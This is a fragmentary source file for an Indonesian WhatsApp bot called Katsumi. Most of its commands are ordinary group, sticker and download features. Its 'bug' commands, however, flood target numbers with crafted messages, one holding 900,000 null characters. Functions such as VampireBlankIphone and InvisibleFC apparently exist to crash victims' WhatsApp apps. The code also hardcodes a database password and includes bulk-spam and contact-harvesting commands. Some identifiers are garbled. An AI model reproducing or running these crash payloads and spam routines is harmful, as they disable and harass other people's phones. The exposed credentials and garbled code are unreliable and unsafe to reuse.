    break
}
...
case "listcase": {
if (!isOwner) return reply(mess.owner)
const code = fs.readFileSync('katsumi.js', 'utf8');
...
${prefix + command} https://whatsapp.com/channel/xxx/123 😂 😱`)
    ...
    await katsumi.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
...
case "addbug": {
    if (!isOwner) return reply(mess.owner)
    if (!m.quoted && !text)
        return reply("Balas pesan atau ketik nomor target\nContoh: .addbug 6285xxx")
    ...
    if (!/^[0-9]+$/.test(input2) || input2.length < 10)
        return reply('Nomor tidak valid! Pastikan nomor minimal 10 digit.')
    
    try {
        await reply('⏳ Sedang menambahkan akses bug...')
        
        const { MongoClient } = require("mongodb")
        
        // Gunakan URI dan nama database yang baru
        const MONGO_URI = "mongodb+srv://fluxxzyofficial_db_user:o1SekIQ7eZbVHHpv@swezesty.lbdr9bs.mongodb.net/swezesty-db?retryWrites=true&w=majority&appName=swezesty";
        const DB_NAME = 'swezesty-db';
        
        // Konfigurasi client dengan timeout yang lebih pendek
        const client = new MongoClient(MONGO_URI, {
            katsumiectTimeoutMS: 8000, // 8 detik timeout
            socketTimeoutMS: 15000, // 15 detik timeout
            maxPoolSize: 5, // Batasi pool size
            minPoolSize: 1,
            maxIdleTimeMS: 10000,
        })

        let dbkatsumiected = false
        
        try {
            // Coba koneksi dengan timeout manual
            await Promise.race([
                client.katsumiect(),
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('⏰ Timeout: Gagal terhubung ke database')), 8000)
                )
            ])
            
            dbkatsumiected = true
            const db = client.db(DB_NAME)
            const accessList = db.collection("accessList")

            // Cek apakah nomor sudah ada
            const existingUser = await accessList.findOne({ number: input2 })
            if (existingUser) {
                return reply('❌ Nomor ini sudah memiliki akses bug!')
            }

            // Tambahkan ke database
            await accessList.insertOne({
                number: input2,
            ...
            await katsumi.sendMessage(m.chat, {
                image: { 
                    url: "https://files.catbox.moe/63uln3",
                    mimetype: "image/jpeg"
                },
                caption: `✅ *Akses Bug Berhasil Ditambahkan*\n\n📱 Nomor: ${input2}\n👤 Ditambahkan oleh: ${m.sender.split('@')[0]}\n⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}`,
                footer: "© Katsumi Bot",
                buttons: [
                    {
                        buttonId: '.listbug',
            ...
            if (dbError.message.includes('Timeout')) {
                reply('⏰ Waktu koneksi habis, silakan coba lagi')
            } else if (dbError.message.includes('auth') || dbError.message.includes('credentials')) {
                reply('🔐 Gagal autentikasi ke database')
            } else if (dbError.message.includes('network') || dbError.message.includes('katsumiection')) {
                reply('🌐 Gagal terhubung ke database, cek koneksi internet')
            } else if (dbError.code === 'ETIMEOUT' || dbError.code === 'EkatsumiREFUSED') {
                reply('❌ Database sedang offline atau tidak dapat diakses')
            } else {
                reply('⚠️ Gagal mengakses database. Error: ' + dbError.message)
            }
            
        } finally {
            // Pastikan client ditutup jika terhubung
            if (dbkatsumiected && client) {
                try {
                    await client.close()
                } catch (closeError) {
                    console.error("Error closing katsumiection:", closeError.message)
                }
            }
        }

    } catch (err) {
        console.error("AddBug System Error:", err)
...
const { downloadContentFromMessage } = require("@purpleiriss/irisbail");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    ...
    if (/video/.test(type)) {
        return katsumi.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return katsumi.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return katsumi.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
//----------- ( case bug  ) 
...
const senderNumber = m.sender.replace(/[^0-9]/g, '');
  const hasBugAccess = await checkAccessBug(senderNumber);
  
  if (!hasBugAccess) return reply(mess.bug);
...
for (let i = 0; i < 50; i++) {
await katsumi.relayMessage(target, {
contactMessage: {
...
case 'katsumiunder': {
  ...
  for (let i = 0; i < 100; i++) {
await katsumi.relayMessage(target, {groupStatusMessageV2: {
message: {
messageContextInfo: {
deviceListMetadata: {},
...
body: {
text: "ktsumiech" + "\0".repeat(900000),
},
nativeFlowMessage: {
messageParamsJson: "Y",
buttons: [
...
case 'listgc': {
 ...
 try {
 const getGroups = await katsumi.groupFetchAllParticipating();
...
katsumi.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: m})
}
break
...
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owner.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi owner bot!`)
owner.push(input)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
...
let id = await katsumi.groupAcceptInvite(result)
...
katsumi.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qkontak})
}
break
case "addprem": {
if (!isOwner) return reply(mess.owner)
...
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
case "public":{
if (!isOwner) return reply(mess.owner)
...
case "self":{
if (!isOwner) return reply(mess.owner)
katsumi.public = false
reply(`successfully changed to ${command}`)
}
break
case 'delppbot': {
if (!isOwner) return reply(mess.owner)
await katsumi.removeProfilePicture(katsumi.user.id)
...
case "jpmc": {
    ...
    for (let i of res) {
        try {
            const groupMetadata = await katsumi.groupMetadata(i)
            const participants = groupMetadata.participants
            
            const mentions = participants.map(p => p.id)
            
            const broadcastText = `📢 ᴊᴘᴍ ʙʏ ᴋᴀᴛsᴜᴍɪ - ᴍᴅ\n\n${teks}\n\n@${namaBot}`
            ...
            try {
                ...
                console.log(`✅ Broadcast + SW sent to: ${i} (${mentions.length} members tagged)`)
            } catch (swError) {
                console.log(`⚠️ Gagal sw gb ke ${i}: ${swError.message}`)
            }
...
var medis = await katsumi.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
...
var memeg = await katsumi.updateProfilePicture(botNumber, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
...
await reply('Sukses mengaktifkan autotyping.')
} else if (args[0] === 'off') {
global.autotyping = false
await reply('Sukses menonaktifkan autotyping.')
}}

break               
case 'autosholat': {
katsumi.autoshalat = katsumi.autoshalat ? katsumi.autoshalat : {}

 if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Contoh: ${prefix+command} on/off`)

 if (text === "on") {
 katsumi.autoshalat[sender] = {
 messages: []
 };
 reply(`[ ✓ ] sukses mode*\`Auto-Sholat\`* : ᴀᴋᴛɪғ`);
 } else if (text === "off") {
 delete katsumi.autoshalat[sender];
 reply(`[ ✓ ] sukses mode *\`Auto-Sholat\`* : ɴᴏɴᴀᴋᴛɪғ`);
 }
};
break 
    case 'onlygc': {
...
if (args[0] === 'on') {
global.onlygc = true
await reply(`Sukses mengaktifkan ${prefix+command}.`)
} else if (args[0] === 'off') {
global.onlygc = false
await reply(`Sukses menonaktifkan ${prefix+command}.`)
}}
...
await reply(`Sukses mengaktifkan ${command}.`)
} else if (args[0] === 'off') {
global.autoaigc = false
await reply(`Sukses menonaktifkan ${command}.`)
}}
...
var onWa = await katsumi.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
const res = await katsumi.groupParticipantsUpdate(m.chat, [input], 'remove')
...
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
const urlGrup = "https://chat.whatsapp.com/" + await katsumi.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await katsumi.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
...
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
await katsumi.groupRevokeInvite(m.chat)
...
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.group);
 let users = participants.map(u => u.id).filter(v => v !== katsumi.user.jid)
 if (!m.quoted) return reply(`✳️ Reply to a message`)
 katsumi.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'closetime':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
...
katsumi.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
...
katsumi.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
...
await katsumi.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await katsumi.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
...
if (!isGroup) return reply(mess.group);
if (!isBotAdmins) return reply(mess.botadmin)
await katsumi.removeProfilePicture(from)
}
break
case 'setppgc':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
...
var memeg = await katsumi.updateProfilePicture(m.chat, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
...
const groupMetadata = await katsumi.groupMetadata(m.chat);
const participants = groupMetadata.participants;
...
`
await katsumi.sendMessage(orang, {text: teks}, {quoted: m})
}
break
...
await katsumi.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break
...
await katsumi.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break
...
let media = await katsumi.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await katsumi.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: foother }, {quoted: m})
}
break
case "imagebing": case "bingimage":
case "imgbing": case "bingimg": {
    if (!args.length) return reply("Masukkan prompt gambar!\nContoh: imgbing mobil sport merah");
    let query = encodeURIComponent(args.join(" "));
    let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;
    try {
        await katsumi.sendMessage(from, { react: { text: "⏳", key: m.key } });
        ...
        for (let img of data.data.result) {
            await katsumi.sendMessage(from, { image: { url: img }, caption: "Maaf Jika Tidak Sesuai 😌" }, { quoted: m });
        }
        await katsumi.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (error) {
        console.error(error);
...
case 'toreal': {
  try {
    ...
    const media = await katsumi.downloadAndSaveMediaMessage(quoted)
    ...
    await katsumi.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m })
  } catch (err) {
...
case 'ocr': {
  try {
    ...
    reply(typeof err === 'string' ? err : err.message || 'terjadi kesalahan saat memproses gambar')
  }
}
break
case 'remove-wm': {
  ...
  if (!mime) return reply(`Kirim/reply gambar dengan caption *${usedPrefix + command}*`)
      ...
      case "tt":
        {
          ...
          await tiktokDl(q).then(async result => {
            ...
            if (result.durations == 0 && result.duration == "0 Seconds") {
              ...
              await katsumi.relayMessage(m.chat, msgii.message, {
...
await katsumi.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
...
if (anu.status) {
let urlMp3 = anu.download.url
await katsumi.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return reply("Error! Result Not Found")
}
await katsumi.sendMessage(m.chat, {react: {text: '', key: m.key}})
...
case 'gddl':
    case 'gdrive': {
      try {
        ...
        return await katsumi.sendMessage(m.chat, {
          document: {
...
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    ...
    katsumi.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
}
break
...
case 'getpb': {
 ...
 await katsumi.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
...
case "uppastebin": {
  ...
  await reply('Tunggu sebentar kak...');
  ...
  try {
    ...
    await katsumim.sendMessage(m.chat, { text: `✅ Paste berhasil dibuat:\n${url}` }, { quoted: m });
  } catch (e) {
    console.error(e);
    reply('Terjadi error saat membuat paste. Coba lagi nanti.');
  }
};
break
case 'ssweb':
case 'ss-web': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
  
  await katsumi.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/tools/ssweb?url=${text}&theme=light&device=desktop` }, caption: foother }, {quoted: m})
}
break
case 'sendchat': {
...
mediaType: 1, 
previewType: 1, 
sourceUrl: "https://katsumibotv6.vestia.icu", 
}}
}, {quoted: m })
}
...
case 'stalkch': {
  ...
  try {
    ...
    if (data.status === 200 && data.result) {
      ...
      reply('Gagal mengambil data channel. Coba lagi nanti.');
    }
  } catch (e) {
    console.error(e);
...
case 'tts': {
 ...
 let statusMessage = await katsumi.sendMessage(m.chat, { text: `⏳ Menghubungi karakter *${character.displayName}*...` }, { quoted: m });
 ...
 await katsumi.sendMessage(m.chat, { text: `✅ Link ditemukan, mengunduh suara...`, edit: statusMessage.key });
 ...
 await katsumi.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 await katsumi.sendMessage(m.chat, { delete: statusMessage.key });
 return;

 } catch (error) {
 console.error(`Percobaan ke-${attempt} untuk ${character.displayName} gagal:`, error.message);
 if (attempt === maxRetries) {
 await katsumi.sendMessage(m.chat, { text: `❌ Gagal total setelah ${maxRetries} percobaan.\n*Alasan:* ${error.message}`, edit: statusMessage.key });
 return;
 }
...
let media = await katsumi.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await katsumi.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/iloveimg/removebg?image=${response}` }, caption: foother }, {quoted: m})
}
break
case 'emojimix': {
...
let encmedia = await katsumi.sendImageAsSticker(m.chat, res.url, m, {
packname: foother,
author: nama,
categories: res.tags
})
...
case 'bratvid': { 
    ...
    try {
        await reply(isVideo ? '🎀 Sedang membuat sticker brat video...' : '🎀 Sedang membuat sticker brat...');
        ...
        console.error(err);
        reply(isVideo ? '❌ Gagal membuat sticker brat video.' : '❌ Gagal membuat sticker brat.');
    }
} 
break;
case 'bratvids': {
  if (!args[0]) return reply('🎀 Masukkan teks untuk membuat sticker video brat!\n\nContoh: .bratvid hamil nyaman');

  const text = args.join(' ');
  const api = `https://brat.siputzx.my.id/gif?text=${encodeURIComponent(text)}`;

  try {
    reply('💅 Sedang membuat sticker brat video kamu...');
    ...
    const sticker = new Sticker(buffer, {
      ...
      type: StickerTypes.FULL, // Bisa juga StickerTypes.VIDEO
      quality: 80,
      animated: true,
    });

    const stickerBuffer = await sticker.build();
    await katsumi.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply('❌ Gagal membuat sticker brat video. Coba lagi nanti!');
  }
}
break;
...
case 'stikermeme': {
    try {
        if (!/image|webp/.test(mime)) 
            return reply(`*_Syntax Error_*\n*Use:* Kirim/Balas Gambar/Sticker Dengan Caption ${prefix+command} teks-atas|teks-bawah\n*Example:* ${prefix+command} mau kontol? `)
        
        if (!text) 
            return reply(`Kirim/Balas Gambar/Sticker Dengan Caption ${prefix+command} teks-atas|teks-bawah`)
        ...
        if (!mem || !mem.url) throw new Error('Upload gambar gagal')
        
        let encodedAtas = encodeURIComponent(atas)
        let encodedBawah = encodeURIComponent(bawah)
        let encodedUrl = encodeURIComponent(mem.url)
        
        let smeme = `https://api.memegen.link/images/custom/${encodedAtas}/${encodedBawah}.png?background=${encodedUrl}`
        
        await katsumi.sendAsSticker(m.chat, smeme, qkontak, { 
            packname: "ᴋᴀᴛsᴜᴍɪ - ᴍᴅ",
            author: "# ᴇᴄʜᴏ ᴄᴏɴɴᴇᴄᴛ" 
        })
...
case 'cewebrat':
    case 'bratcewe': {
      if (!text) return reply(`Contoh: halo`)
      if (text.length > 50) return reply(`Karakter terbatas, max 50!`)
    ...
    try {
      ...
      Brats(text).then(async buffer => {
        await katsumi.sendImageAsSticker(m.chat, buffer, m, {
          packname: "ᴋᴀᴛsᴜᴍɪ - ᴍᴅ",
          author: "# ᴇᴄʜᴏ ᴄᴏɴɴᴇᴄᴛ"
        })
      }).catch(err => {
...
katsumi.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply video/audio dengan caption ${prefix + command}`)
...
//await loading()
var dl = await m.quoted.download()
katsumi.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'readmore':
case 'selengkapnya': {
...
katsumi.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
...
var image = await katsumi.downloadAndSaveMediaMessage(qmsg)
await katsumi.sendImageAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
katsumi.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
...
if (/video/gi.test(mime) && qmsg.seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
var image = await katsumi.downloadAndSaveMediaMessage(qmsg)
await katsumi.sendImageAsSticker(m.chat, image, m, {packname: foother})
await fs.unlinkSync(image)
katsumi.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
...
mee = await katsumi.downloadAndSaveMediaMessage(quoted)
...
memek = await katsumi.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
...
let media = await katsumi.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'katsumi.png');
...
case "hdvid": {
    ...
    if (!ffmpegStatic) {
        return katsumi.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ...
    try {
        ...
        if (!mime) return katsumi.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return katsumi.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        katsumi.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return katsumi.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        ...
        katsumi.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
...
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await katsumi.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
...
katsumi.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
} catch (error) {
console.error(error);
}
}
    ...
    case 'qc':
    case 'qcstick': {
      if (!args[0]) return reply(`Contoh: ${command} white halo`)
      if (!args[1]) return reply(`Contoh: ${command} white halo`)
      ...
      const avatar = await katsumi.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
      const json = {
        type: 'quote',
        format: 'png',
        backgroundColor,
      ...
      katsumi.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author
      })
    }
...
try {
    ...
    case 'piatu': {
       if (!isGroup) return reply(mess.group);
      let member = participants.map(u => u.id).filter(v => v !== katsumi.user.jid)
...
if (anu.status == false) return reply(anu.message)
katsumi.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
...
if (anu.status == false) return reply(anu.message)
katsumi.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
...
if (!text.split("|")) return reply("idgrup|pesannya")
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await katsumi.groupMetadata(id)
...
const vcard = 'BEGIN:VCARD\n'
            ...
            + 'END:VCARD'
const sentMsg  = await katsumi.sendMessage(mem, { contacts: { displayName: nama, contacts: [{ vcard }] }})
await katsumi.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(10000)
}}

await katsumi.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break
...
const teks = text
const jidawal = m.chat
const data = await katsumi.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
...
let res = await katsumi.groupMetadata(m.chat)
...
await katsumi.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
...
case 'jadwal-sholat':
    case 'jadwalsholat': {
      if (!text) return reply('Mau kota mana?')
      try {
        const {
          jadwalSholat
        } = require('./lib/scraper')
        const jadwal = await jadwalSholat(text.toLowerCase().replace(/\s+/g, '-'))
        if (jadwal.error) return reply(jadwal.error)
...
case 'txt2img': {
  ...
  await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=dreamshaper-8-base` }, caption: foother }, {quoted: m})
}
break
...
case 'txt2imgv2': {
  ...
  await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/flux/schnell?prompt=${text}&size=9_16` }, caption: foother }, {quoted: m})
}
break
...
case 'txt2imgv3': {
  ...
  await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-fast` }, caption: foother }, {quoted: m})
}
break
...
case 'txt2imgv4': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
    ...
    await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-base` }, caption: foother }, {quoted: m})
}
break
...
case 'txt2imgv5': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
    ...
    await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/amazonai?prompt=${text}&size=9_16` }, caption: foother }, {quoted: m})
}
break
...
case 'txt2imgv6': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
    ...
    await katsumi.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/gemini?prompt=${text}` }, caption: foother }, {quoted: m})
}
break
...
case 'bratgenerator': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
    ...
    await katsumi.sendMessage(m.chat, {image: {url: `https://aqul-brat.hf.space/?text=${text}` }, caption: foother }, {quoted: m})
}
break
case 'pakustad':
case 'pak-ustad': {
  if (!text) return reply(`Contoh: ${command} kenapa katsumi ganteng`)
    
    await katsumi.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/tanya-ustad?quest=${text}` }, caption: foother }, {quoted: m})
}
break
case 'nglgenerator':
case 'ngl': {
  if (!text) return reply(`Contoh: ${command} beautiful girl with handsome man`)
    ...
    await katsumi.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/ngl?text=${text}` }, caption: foother }, {quoted: m})
}
break
    case 'attp': {
...
async function brat(text) {
 ...
 delete katsumi.enhancer[sender];
 katsumi.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await katsumi.sendImageAsSticker(m.chat, buf.image, m, { packname: nama, author: nama })
}
break
case 'pak-ustad2':
case 'pakustad2': {
...
iwannnnnnnn += ""
katsumi.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
...
katsumi.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
...
iwannnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
katsumi.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
...
iwannnnnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
katsumi.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
...
tekcs += `Source: ${reis}`
tekcs += ""
katsumi.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
}
break
...
case 'tiktokgirl':
if (!isOwner && !isPremium) return reply(mess.owner)
katsumi.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
var hasil = pickRandom(asupan)
katsumi.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'ghea':
case 'tiktokghea':
  if (!isOwner && !isPremium) return reply(mess.owner)
...
if (!isPrivate) return reply(`Khusus Di Private Chat!!`)
      ...
      let p = (await katsumi.onWhatsApp(jid))[0] || {}
      ...
      if (mf) return !0
         ...
         txt += `_${msg.trim()}_\n\n${readmore}Mau balas pesan ini kak? bisa kok kak. tinggal ketik pesannya kakak lalu kirim, nanti saya sampaikan ke ${heri}`
             ...
             await katsumi.sendMessage(p.jid, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        title: 'Confess',
...
await katsumi.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
...
let res = await katsumi.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
...
case 'sendgc': {
  ...
  for (let id of ownerJid) {
    katsumi.sendMessage(id, {image: {url: thumbnail }, caption: text, mentions: [m.sender] }, {quoted: m})
}
...
*Testimoni :*
${ch}\n`
await katsumi.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
...
katsumi.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
...
await katsumi.sendMessage(m.chat, {image: {url: qris }, caption: `dana : ${dana}\ngopay : ${gopay}`  }, {quoted: m})
}
break
...
case 'playstore':
    case 'pstore': {
      if (!text) return reply(`Contoh: ${command} whatsapp`);
      try {
...
Link Developer: ${yoo.link_dev}`;
    ...
    case 'playstation':
    case 'pstation': {
      if (!text) return reply(`Contoh: ${command} Naruto`);
      try {
...
Link: ${yoo.link}`;
    ...
    case 'google': {
      if (!text) return reply(`Contoh: ${command} katsumi`)
...
let msg = generateWAMessageFromContent(m.chat, {
 ...
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: image }}, { upload: katsumi.waUploadToServer })) 
 }),
...
var anu = await ytdl.ytmp3(`${rees.url}`)
 await katsumi.sendMessage(m.chat, {image: {url: `${rees.thumbnail}` }, caption: `*[ Menemukan ]*\n${rees.title}\n${rees.url}\n\nMengirim Audio...` }, {quoted: m})
 }
if (anu.status) {
let urlMp3 = anu.download.url
await katsumi.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
...
async function VampireBlankIphone(target) {
    try {
        ...
        await katsumi.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
...
await katsumi.relayMessage(target, messagePayload, { participant: { jid: target } });
}
async function Blankhard(target) {
  ...
  await katsumi.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
...
async function InvisibleFC(target) {
  try {
    ...
    await katsumi.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
